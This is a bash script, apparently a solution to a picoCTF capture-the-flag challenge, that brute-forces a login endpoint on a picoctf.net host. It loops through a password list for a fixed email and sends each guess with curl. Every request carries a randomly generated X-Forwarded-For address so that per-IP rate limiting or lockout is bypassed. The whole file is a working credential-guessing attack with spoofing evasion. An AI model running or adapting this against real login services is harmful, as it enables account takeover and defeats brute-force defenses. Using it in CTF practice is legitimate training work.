#!/bin/bash

random_ip() {
    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
}

url="http://amiable-citadel.picoctf.net:61907/login"
email="ctf-player@picoctf.org"

while read -r pass; do
    ip=$(random_ip)
    echo "[*] Trying email: $email, password: $pass from IP: $ip"
    curl -X POST $url -H "'Content-Type': 'application/json'" -H "X-Forwarded-For: $ip" -d "email=$email" -d "password=$pass"

    echo
done < passwords.txt
